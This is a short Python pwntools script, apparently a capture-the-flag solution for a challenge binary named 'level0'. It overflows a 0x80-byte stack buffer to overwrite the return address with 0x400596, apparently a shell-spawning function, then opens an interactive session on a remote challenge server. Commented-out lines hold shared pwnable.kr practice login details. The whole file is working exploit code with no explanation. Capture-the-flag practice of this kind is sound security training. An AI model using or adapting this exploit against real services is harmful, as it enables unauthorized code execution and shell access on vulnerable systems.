#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

vunlu_addr = 0x0000000000400596
DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./level0")
	
else:
	#pwn2.jarvisoj.com 9881
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("111.198.29.45",30000)
#gdb.attach(io,"b *0x0000065B")
#context.log_level = "debug"
payload = ""
payload += "A"*0x80# 覆盖ret
payload += "junkjunk"
payload += p64(vunlu_addr)# 覆盖ret
io.sendafter("Hello, World\n",payload)
io.interactive()
